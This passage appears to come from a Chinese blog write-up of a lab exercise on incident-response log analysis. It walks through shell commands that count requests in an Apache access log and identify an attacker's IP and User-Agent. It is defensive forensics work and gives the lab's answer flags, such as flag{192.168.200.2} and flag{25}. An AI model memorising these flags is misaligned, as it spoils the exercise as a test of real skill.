class="toc-text">什么情况下需要 UDF 提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B8%E5%9E%8B%E7%9A%84-UDF-%E6%8F%90%E6%9D%83%E6%94%BB%E5%87%BB%E6%AD%A5%E9%AA%A4%EF%BC%9A"><span class="toc-number">2.2.5.6.</span> <span class="toc-text">典型的 UDF 提权攻击步骤：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5%E5%92%8C%E9%98%B2%E6%8A%A4UDF"><span class="toc-number">2.2.5.7.</span> <span class="toc-text">检查和防护UDF</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%E9%A2%984-%E9%BB%91%E5%AE%A2%E8%8E%B7%E5%8F%96%E7%9A%84%E6%9D%83%E9%99%90"><span class="toc-number">2.2.6.</span> <span class="toc-text">问题4:.黑客获取的权限</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#UDF-%E6%8F%90%E6%9D%83%E7%9A%84%E5%85%B8%E5%9E%8B%E7%97%95%E8%BF%B9"><span class="toc-number">2.2.6.1.</span> <span class="toc-text">UDF 提权的典型痕迹</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-redis%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94"><span class="toc-number">2.3.</span> <span class="toc-text">第二章日志分析-redis应急响应</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFredis"><span class="toc-number">2.3.1.</span> <span class="toc-text">什么是redis</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E4%BA%8ERedis%E7%9A%84%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95%E6%9C%89"><span class="toc-number">2.3.2.</span> <span class="toc-text">关于Redis的攻击手法有</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Redis-%E7%9A%84%E4%B8%80%E4%BA%9B%E5%85%B3%E9%94%AE%E7%89%B9%E6%80%A7%E5%92%8C%E7%94%A8%E9%80%94%EF%BC%9A"><span class="toc-number">2.3.3.</span> <span class="toc-text">Redis 的一些关键特性和用途：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E7%9A%84%E5%B8%B8%E8%A7%81%E7%94%A8%E9%80%94%EF%BC%9A"><span class="toc-number">2.3.4.</span> <span class="toc-text">基本的常见用途：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%E9%A2%981%EF%BC%9A%E9%80%9A%E8%BF%87%E6%9C%AC%E5%9C%B0-PC-SSH%E5%88%B0%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%B9%B6%E4%B8%94%E5%88%86%E6%9E%90%E9%BB%91%E5%AE%A2%E6%94%BB%E5%87%BB%E6%88%90%E5%8A%9F%E7%9A%84-IP-%E4%B8%BA%E5%A4%9A%E5%B0%91"><span class="toc-number">2.3.5.</span> <span class="toc-text">问题1：通过本地 PC SSH到服务器并且分析黑客攻击成功的 IP 为多少</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E6%94%BB%E5%87%BB"><span class="toc-number">2.3.5.1.</span> <span class="toc-text">redis主从复制攻击</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%E9%A2%982-%E9%80%9A%E8%BF%87%E6%9C%AC%E5%9C%B0-PC-SSH%E5%88%B0%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%B9%B6%E4%B8%94%E5%88%86%E6%9E%90%E9%BB%91%E5%AE%A2%E7%AC%AC%E4%B8%80%E6%AC%A1%E4%B8%8A%E4%BC%A0%E7%9A%84%E6%81%B6%E6%84%8F%E6%96%87%E4%BB%B6"><span class="toc-number">2.3.6.</span> <span class="toc-text">问题2:通过本地 PC SSH到服务器并且分析黑客第一次上传的恶意文件</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88-SLAVEOF-%E7%AE%97%E4%BD%9C%E6%81%B6%E6%84%8F%E8%A1%8C%E4%B8%BA%EF%BC%9F"><span class="toc-number">2.3.6.1.</span> <span class="toc-text">为什么 SLAVEOF 算作恶意行为？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%82%A3%E6%88%91%E4%BB%AC%E5%BA%94%E8%AF%A5%E5%A6%82%E4%BD%95%E6%89%BE%E5%88%B0%E6%81%B6%E6%84%8F%E6%96%87%E4%BB%B6%E5%91%A2"><span class="toc-number">2.3.6.2.</span> <span class="toc-text">那我们应该如何找到恶意文件呢?</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%E9%A2%983-%E9%80%9A%E8%BF%87%E6%9C%AC%E5%9C%B0-PC-SSH%E5%88%B0%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%B9%B6%E4%B8%94%E5%88%86%E6%9E%90%E9%BB%91%E5%AE%A2%E5%8F%8D%E5%BC%B9-shell-%E7%9A%84IP-%E4%B8%BA%E5%A4%9A%E5%B0%91"><span class="toc-number">2.3.7.</span> <span class="toc-text">问题3:通过本地 PC SSH到服务器并且分析黑客反弹 shell 的IP 为多少</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%E9%A2%984-%E9%80%9A%E8%BF%87%E6%9C%AC%E5%9C%B0-PC-SSH%E5%88%B0%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%B9%B6%E4%B8%94%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90%E9%BB%91%E5%AE%A2%E7%9A%84%E7%94%A8%E6%88%B7%E5%90%8D%EF%BC%8C%E5%B9%B6%E4%B8%94%E6%89%BE%E5%88%B0%E9%BB%91%E5%AE%A2%E4%BD%BF%E7%94%A8%E7%9A%84%E5%B7%A5%E5%85%B7%E9%87%8C%E7%9A%84%E5%85%B3%E9%94%AE%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="toc-number">2.3.8.</span> <span class="toc-text">问题4:通过本地 PC SSH到服务器并且溯源分析黑客的用户名，并且找到黑客使用的工具里的关键字符串</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%E9%A2%985-%E9%80%9A%E8%BF%87%E6%9C%AC%E5%9C%B0-PC-SSH%E5%88%B0%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%B9%B6%E4%B8%94%E5%88%86%E6%9E%90%E9%BB%91%E5%AE%A2%E7%AF%A1%E6%94%B9%E7%9A%84%E5%91%BD%E4%BB%A4"><span class="toc-number">2.3.9.</span> <span class="toc-text">问题5:通过本地 PC SSH到服务器并且分析黑客篡改的命令</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        玄机第二章日志分析(二刷)
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">wanTh3flag</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-04-21T09:10:25.000Z" class="dt-published" itemprop="datePublished">2025-04-21</time>
+        
+        (Updated: <time datetime="2025-05-16T03:39:07.366Z" class="dt-updated" itemprop="dateModified">2025-05-16</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/%E7%8E%84%E6%9C%BA/">玄机</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/" rel="tag">玄机第二章日志分析</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="0x01前言"><a href="#0x01前言" class="headerlink" title="0x01前言"></a>0x01前言</h1><p>继续开始玄机第二章的学习</p>
+<p>感谢师傅的wp，讲的真的很详细</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/administratorlws/article/details/139574366?ops_request_misc=%7B%22request_id%22:%22b99b24403d7f7572af4ea5e29fd9f779%22,%22scm%22:%2220140713.130102334.pc_blog.%22%7D&request_id=b99b24403d7f7572af4ea5e29fd9f779&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-5-139574366-null-null.nonecase&utm_term=%E7%AC%AC%E4%B8%80%E7%AB%A0&spm=1018.2226.3001.4450">玄机——第二章 日志分析-apache日志分析 wp_第二章日志分析-apache日志分析-CSDN博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/administratorlws/article/details/139574366?ops_request_misc=%7B%22request_id%22:%22b99b24403d7f7572af4ea5e29fd9f779%22,%22scm%22:%2220140713.130102334.pc_blog.%22%7D&request_id=b99b24403d7f7572af4ea5e29fd9f779&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-5-139574366-null-null.nonecase&utm_term=%E7%AC%AC%E4%B8%80%E7%AB%A0&spm=1018.2226.3001.4450">玄机——第二章 日志分析-apache日志分析 wp_第二章日志分析-apache日志分析-CSDN博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/administratorlws/article/details/140024637?ops_request_misc=%7B%22request_id%22:%22b99b24403d7f7572af4ea5e29fd9f779%22,%22scm%22:%2220140713.130102334.pc_blog.%22%7D&request_id=b99b24403d7f7572af4ea5e29fd9f779&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-11-140024637-null-null.nonecase&utm_term=%E7%AC%AC%E4%B8%80%E7%AB%A0&spm=1018.2226.3001.4450">玄机——第二章日志分析-redis应急响应 wp-CSDN博客</a></p>
+<h1 id="0x01正文"><a href="#0x01正文" class="headerlink" title="0x01正文"></a>0x01正文</h1><h2 id="第二章日志分析-apache日志分析"><a href="#第二章日志分析-apache日志分析" class="headerlink" title="第二章日志分析-apache日志分析"></a>第二章日志分析-apache日志分析</h2><h3 id="什么是apache日志分析？"><a href="#什么是apache日志分析？" class="headerlink" title="什么是apache日志分析？"></a><strong>什么是apache日志分析？</strong></h3><p>日志分析是监控和优化网站性能、安全性和用户体验的重要手段。Apache日志分析是其中的一个重要组成部分，因为Apache是目前最流行的Web服务器之一。Apache日志记录了服务器上的各种活动，包括访问请求、错误信息、用户行为等。通过分析这些日志，可以获取有价值的信息，帮助网站管理员做出更好的决策。</p>
+<h4 id="Apache日志分析"><a href="#Apache日志分析" class="headerlink" title="Apache日志分析"></a>Apache日志分析</h4><p>Apache日志分析是专门针对Apache HTTP服务器生成的日志文件进行分析。Apache服务器主要生成两种类型的日志文件：</p>
+<ul>
+<li>成功日志（access log）：</li>
+</ul>
+<p>记录了所有对Web服务器的请求，包括客户端IP地址、请求时间、请求方式、请求资源、响应状态码、数据传输量等。</p>
+<ul>
+<li>错误日志（error log）：</li>
+</ul>
+<p>记录了服务器在运行过程中遇到的错误和警告信息，包括启动和停止时的信息。</p>
+<h4 id="常见日志文件位置"><a href="#常见日志文件位置" class="headerlink" title="常见日志文件位置"></a>常见日志文件位置</h4><ul>
+<li>Apache日志</li>
+</ul>
+<p>访问日志：默认位置通常是&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log.1（Debian&#x2F;Ubuntu）或&#x2F;var&#x2F;log&#x2F;httpd&#x2F;access_log.1（CentOS&#x2F;RHEL）。<br>错误日志：默认位置通常是&#x2F;var&#x2F;log&#x2F;apache2&#x2F;error.log.1（Debian&#x2F;Ubuntu）或&#x2F;var&#x2F;log&#x2F;httpd&#x2F;error_log.1（CentOS&#x2F;RHEL）。</p>
+<ul>
+<li>SSH日志</li>
+</ul>
+<p>身份验证日志：通常位于&#x2F;var&#x2F;log&#x2F;auth.log（Debian&#x2F;Ubuntu）或&#x2F;var&#x2F;log&#x2F;secure（CentOS&#x2F;RHEL）。</p>
+<ul>
+<li>系统日志</li>
+</ul>
+<p>系统日志：通常位于&#x2F;var&#x2F;log&#x2F;syslog（Debian&#x2F;Ubuntu）或&#x2F;var&#x2F;log&#x2F;messages（CentOS&#x2F;RHEL）。</p>
+<h3 id="问题1-提交当天访问次数最多的IP，即黑客IP"><a href="#问题1-提交当天访问次数最多的IP，即黑客IP" class="headerlink" title="问题1:提交当天访问次数最多的IP，即黑客IP"></a>问题1:提交当天访问次数最多的IP，即黑客IP</h3><p>首先我们要找到的是对应的日志文件，因为是Apache的日志分析，所以对应的Apache的目录就是&#x2F;var&#x2F;log&#x2F;apache2&#x2F;</p>
+<h4 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h4><p>因为是Apache的日志分析，所以我们先进入目录&#x2F;var&#x2F;log&#x2F;apache2&#x2F;</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /var/log/apache2/</span><br></pre></td></tr></table></figure>
+
+<p>然后我们用ls-l看一下路径下文件的基本信息</p>
+<p><img src="/../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20250421162558190.png" alt="image-20250421162558190"></p>
+<p>这里可以看到access.log和error.log的文件是空文件</p>
+<p>我们看一下access.log.1日志文件，发现内容特别多，我先把他传到物理机里</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp root@43.192.115.135:/var/log/apache2/access.log.1 物理机路径</span><br></pre></td></tr></table></figure>
+
+<p>然后用notepad打开</p>
+<p><img src="/../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20250421163356238.png" alt="image-20250421163356238"></p>
+<p>我们先简单看一下，开头的话黑客估计是在访问页面的资源，而后黑客对目录进行了扫描操作，出现大量404</p>
+<p><img src="/../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20250421163842875.png" alt="image-20250421163842875"></p>
+<p>或者在靶机里执行命令去检索</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cut -d- -f 1 access.log.1|uniq -c | sort -rn | head -20</span><br></pre></td></tr></table></figure>
+
+<p>命令解释:</p>
+<ul>
+<li><code>ut</code>：这是一个命令行工具，用于从每一行中提取特定的部分。</li>
+<li><code>-d-</code>：指定字段的分隔符是<code>-</code>（一个连字符）。</li>
+<li><code>-f 1</code>：指定要提取第一个字段（即连字符前的部分）。</li>
+<li><code>access.log.1</code>：输入文件，假设这是Apache访问日志的文件名。</li>
+<li><strong><code>uniq -c</code></strong>:<ul>
+<li><code>uniq</code> 用于从输入中删除重复的行。</li>
+<li><code>-c</code> 选项会在每行前加上一个计数，表示该行在输入中出现的次数。</li>
+<li>注意，<code>uniq</code> 通常需要输入是已排序的，以便其有效地统计重复行。</li>
+</ul>
+</li>
+<li><strong><code>sort -rn</code></strong>:<ul>
+<li><code>sort</code> 用于对输入行进行排序。</li>
+<li><code>-r</code> 表示按递减顺序排序（reverse）。</li>
+<li><code>-n</code> 表示按数值进行排序（numeric）。</li>
+<li>这部分的作用是按照出现次数对 <code>uniq</code> 的输出进行从大到小的排序。</li>
+</ul>
+</li>
+<li><strong><code>head -20</code></strong>:<ul>
+<li><code>head</code> 用于输出文件的开头部分。</li>
+<li><code>-20</code> 指定输出前 20 行。</li>
+<li>结果将是出现次数最多的前 20 个字段及其计数。</li>
+</ul>
+</li>
+</ul>
+<p><img src="/../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20250421163536713.png" alt="image-20250421163536713"></p>
+<p>或者也可以用之前的命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat access.log.1 | awk &#x27;&#123;print $1&#125;&#x27; | uniq -c | sort -nr | more</span><br></pre></td></tr></table></figure>
+
+<p>第一列就是访问的次数，可见第一个ip地址就是访问最多的黑客ip了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;192.168.200.2&#125;</span><br></pre></td></tr></table></figure>
+
+<p>插入一个知识点就是关于cut和cat命令的区别</p>
+<h5 id="cut和cat命令"><a href="#cut和cat命令" class="headerlink" title="cut和cat命令"></a>cut和cat命令</h5><p>cat（concatenate）用于连接文件并打印到标准输出。通常用于查看文件的内容、合并文件和创建文件。</p>
+<p>cut用于从文件的每一行中提取指定的部分。通常用于处理列格式数据，比如从CSV文件中提取某些列。</p>
+<p>两者区别；</p>
+<ul>
+<li>用途不同：</li>
+</ul>
+<p>cat主要用于连接和显示文件内容。</p>
+<p>cut主要用于从文件中提取特定的列或字段。</p>
+<ul>
+<li>功能不同：</li>
+</ul>
+<p>cat可以将多个文件内容合并输出到一个文件或标准输出。</p>
+<p>cut可以根据指定的字符位置、字节位置或分隔符提取部分内容。</p>
+<ul>
+<li>常见用法不同：</li>
+</ul>
+<p>cat常用于快速查看文件内容或合并文件。<br>cut常用于处理表格数据、日志文件等，需要提取特定列的数据。</p>
+<h3 id="问题2-黑客使用的浏览器指纹是什么"><a href="#问题2-黑客使用的浏览器指纹是什么" class="headerlink" title="问题2:黑客使用的浏览器指纹是什么"></a>问题2:黑客使用的浏览器指纹是什么</h3><h4 id="什么是浏览器指纹"><a href="#什么是浏览器指纹" class="headerlink" title="什么是浏览器指纹"></a>什么是浏览器指纹</h4><p>浏览器指纹（Browser Fingerprinting）是指通过收集和分析浏览器和设备的特征信息，创建一个唯一的标识符，从而识别或跟踪用户。这种技术不仅仅依赖于常规的Cookie，还利用浏览器和设备的多种属性来进行识别。</p>
+<h4 id="常见的指纹"><a href="#常见的指纹" class="headerlink" title="常见的指纹"></a>常见的指纹</h4><p>浏览器类型和版本：使用的浏览器及其版本。<br>操作系统：设备所运行的操作系统及其版本。<br>时区：设备的时区设置。<br>语言和区域设置：浏览器和操作系统的语言设置。<br>屏幕分辨率和色深：设备屏幕的分辨率和颜色深度。<br>插件和扩展：已安装的浏览器插件和扩展。<br>字体：系统上安装的字体。<br>HTTP头：浏览器在请求时发送的HTTP头信息，包括User-Agent、Accept、Accept-Language等。<br>Canvas指纹：使用HTML5 Canvas元素绘制图形并分析生成的图像数据，以获取独特的图形渲染特征。<br>WebGL指纹：利用WebGL的特性，通过绘制3D图形来获取设备的渲染特性。<br>设备性能特征：CPU、GPU、内存等硬件信息。</p>
+<h4 id="使用浏览器指纹的目的"><a href="#使用浏览器指纹的目的" class="headerlink" title="使用浏览器指纹的目的"></a>使用浏览器指纹的目的</h4><p>追踪用户活动：在用户禁用Cookie或使用隐私保护工具时，仍然能够跟踪用户的在线活动。<br>识别并避开安全系统：通过识别用户的浏览器指纹，可以绕过某些安全系统或反欺诈措施，假装成合法用户进行恶意活动。<br>目标攻击：了解目标用户的设备和浏览器特性，从而制定更有针对性的攻击策略，比如利用特定浏览器或操作系统的已知漏洞进行攻击。</p>
+<h4 id="解题-1"><a href="#解题-1" class="headerlink" title="解题"></a>解题</h4><p>因为我们刚刚知道了黑客的ip，所以直接查看ip的信息就行了</p>
+<p><code>cat access.log.1 |grep 192.168.200.2 |more</code></p>
+<p>为什么这个命令能帮我们拿到指纹信息?</p>
+<ul>
+<li>它可以帮助你找到与特定 IP 地址相关的请求信息。这些请求通常包含在网络服务器的访问日志中，每个请求可能包含用户代理字符串（User-Agent），其中包含浏览器指纹信息。</li>
+</ul>
+<p><img src="/./../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20241117200431439.png" alt="image-20241117200431439"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，这里有很多一样的，直接md5加密交flag就行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;2d6330f380f44ac20f3a02eed0958f66&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="问题3-查看index-php页面被访问的次数"><a href="#问题3-查看index-php页面被访问的次数" class="headerlink" title="问题3:查看index.php页面被访问的次数"></a>问题3:查看index.php页面被访问的次数</h3><p>查看页面访问情况，也是可以用之前的命令的</p>
+<h4 id="解题流程"><a href="#解题流程" class="headerlink" title="解题流程:"></a>解题流程:</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat access.log.1| grep -a &#x27;index.php&#x27; </span><br></pre></td></tr></table></figure>
+
+<p>这将输出所有包含 index.php 的访问记录。</p>
+<p>使用 wc -l 命令统计行数<br>wc -l 命令用于统计行数，即访问次数。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat access.log.1| grep -a &#x27;index.php&#x27;  | wc -l</span><br></pre></td></tr></table></figure>
+
+<p>这个命令会输出包含 index.php 的访问记录的总行数，即 index.php 被访问的次数。<br>所以我们的命令:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat access.log.1| grep -a &#x27;/index.php&#x27; | wc -l</span><br></pre></td></tr></table></figure>
+
+<p>但是值得注意的是，当我们使用cat，一定得是&#x2F;index.php文件表示当前目录下的index.php，因为这个文件很普遍所以我们还是严谨一点比较好</p>
+<p><img src="/../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20250421164724063.png" alt="image-20250421164724063"></p>
+<p>可以看到是27次，直接交flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;27&#125;</span><br></pre></td></tr></table></figure>
+
+<p>但是不对啊，我们再看看包含index.php的记录有哪些</p>
+<p><img src="/../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20250421165214789.png" alt="image-20250421165214789"></p>
+<p>发现两个并非访问&#x2F;index.php的记录，那最后就是25次</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;25&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这次对了</p>
+<h3 id="问题4：查看黑客IP访问了多少次"><a href="#问题4：查看黑客IP访问了多少次" class="headerlink" title="问题4：查看黑客IP访问了多少次"></a>问题4：查看黑客IP访问了多少次</h3><p>因为我们已经知道了黑客ip，所以直接下手就行</p>
+<h4 id="解题-2"><a href="#解题-2" class="headerlink" title="解题"></a>解题</h4><h5 id="第一种命令"><a href="#第一种命令" class="headerlink" title="第一种命令"></a>第一种命令</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat access.log.1 | grep “192.168.200.2 - -” | wc -l</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>grep “192.168.200.2 - -“:</li>
+</ul>
+<p>从 cat 命令输出的内容中通过grep筛选出包含字符串 192.168.200.2 - - 的行。这通常意味着你在查找某个特定 IP 地址的访问记录。</p>
+<ul>
+<li>wc -l:</li>
+</ul>
+<p>统计通过 grep 筛选出的行数，即包含 192.168.200.2 - - 的行数。</p>
+<p>那为什么这里是–呢?</p>
+<p>在 Apache 访问日志中，格式通常是标准的组合日志格式（Combined Log Format），包含了客户端 IP 地址、客户端身份验证信息、用户 ID、请求时间、请求行、状态码、响应大小、引用来源和用户代理等信息。以下是一个典型的日志条目：</p>
+<p>例如；</p>
+<p>192.168.200.2 - - [03&#x2F;Aug&#x2F;2023:08:00:00 +0000] “GET &#x2F;index.php HTTP&#x2F;1.1” 200 1234 “-“ “Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64)”<br>在这个日志条目中，<code>192.168.200.2</code> 是客户端 IP 地址，<code>- -</code> 是占位符，表示客户端身份验证信息（客户端身份验证信息为空时用 <code>-</code> 表示）。</p>
+<p>当然这里也可以用grep -w “192.168.200.2” access.log.1 |wc -l，因为-w参数可以进行全匹配</p>
+<h5 id="第二种命令"><a href="#第二种命令" class="headerlink" title="第二种命令"></a>第二种命令</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat access.log.1 | grep &quot;192.168.200.2&quot; | cut -d&#x27; &#x27; -f1 | sort | uniq -c</span><br></pre></td></tr></table></figure>
+
+<p>作用:这个命令 cat access.log.1 | grep “192.168.200.2” | cut -d’ ‘ -f1 | sort | uniq -c 的作用是从 access.log.1 文件中筛选出指定 IP 地址的访问记录，并统计每个 IP 地址的出现次数。</p>
+<ul>
+<li>cut -d’ ‘ -f1：</li>
+</ul>
+<p>cut 命令用于从每行中提取指定的字段。</p>
+<p>-d’ ‘ 表示字段分隔符是空格。</p>
+<p>-f1 表示提取第一个字段，即 IP 地址。</p>
+<ul>
+<li>sort：</li>
+</ul>
+<p>sort 命令用于对输入内容进行排序。</p>
+<p>这里它对提取出的 IP 地址进行排序。</p>
+<ul>
+<li>uniq -c：</li>
+</ul>
+<p>uniq 命令用于去除重复的行。<br>-c 选项表示在输出中包含每个唯一行前出现的次数。<br>这里它统计每个唯一 IP 地址出现的次数。</p>
+<h4 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h4><ul>
+<li>读取日志文件：</li>
+</ul>
+<p>使用 cat 命令读取 access.log.1 的内容。</p>
+<ul>
+<li>过滤特定 IP 的访问记录：</li>
+</ul>
+<p>使用 grep “192.168.200.2” 筛选出包含指定 IP 地址的行。</p>
+<ul>
+<li>提取 IP 地址：</li>
+</ul>
+<p>使用 cut -d’ ‘ -f1 提取每一行的第一个字段，即 IP 地址。</p>
+<ul>
+<li>排序：</li>
+</ul>
+<p>使用 sort 对提取出的 IP 地址进行排序，以便 uniq 能够正确统计连续出现的相同 IP 地址。</p>
+<ul>
+<li>统计出现次数：</li>
+</ul>
+<p>使用 uniq -c 统计每个唯一 IP 地址出现的次数，并在每个 IP 地址前显示其出现的次数。</p>
+<h5 id="第三个命令"><a href="#第三个命令" class="headerlink" title="第三个命令"></a>第三个命令</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep &quot;192.168.200.2&quot; access.log.1 | cut -d&#x27; &#x27; -f1 | sort | uniq -c</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>cut -d’ ‘ -f1：</li>
+</ul>
+<p>cut 命令用于从每行中提取指定的字段。</p>
+<p>-d’ ‘ 表示字段分隔符是空格。</p>
+<p>-f1 表示提取第一个字段，即提取每行的第一个字段。</p>
+<p>在典型的访问日志格式中，第一字段通常是 IP 地址，所以这一步提取出所有包含 IP 地址 192.168.200.2 的记录的 IP 地址部分。</p>
+<ul>
+<li>sort：</li>
+</ul>
+<p>sort 命令用于对输入内容进行排序。</p>
+<p>这里它对提取出的 IP 地址进行排序，以便 uniq 能够正确统计连续出现的相同 IP 地址。</p>
+<p>排序是为了后续步骤中的去重和计数。</p>
+<ul>
+<li>uniq -c：</li>
+</ul>
+<p>uniq 命令用于去除重复的行。</p>
+<p>-c 选项表示在输出中包含每个唯一行前出现的次数。</p>
+<p>这里它统计每个唯一 IP 地址出现的次数，并在每个 IP 地址前显示其出现的次数。</p>
+<ul>
+<li>简单来说就是；</li>
+</ul>
+<p>过滤：使用 grep 筛选包含指定 IP 地址 192.168.200.2 的日志记录。</p>
+<p>提取字段：使用 cut 提取每行的第一个字段，即 IP 地址部分。</p>
+<p>排序：使用 sort 对提取出的 IP 地址进行排序。</p>
+<p>统计：使用 uniq -c 统计每个 IP 地址的出现次数。</p>
+<ul>
+<li>区别</li>
+</ul>
+<p>这两个命令的主要区别在于是否使用了 cat 命令，这个不用我多说了吧？：</p>
+<p>1.grep “192.168.200.2” access.log.1 | cut -d’ ‘ -f1 | sort | uniq -c：</p>
+<p>直接使用 grep 从文件 access.log.1 中搜索包含 192.168.200.2 的行。<br>后续步骤提取、排序和统计。<br>2.cat access.log.1 | grep “192.168.200.2” | cut -d’ ‘ -f1 | sort | uniq -c：</p>
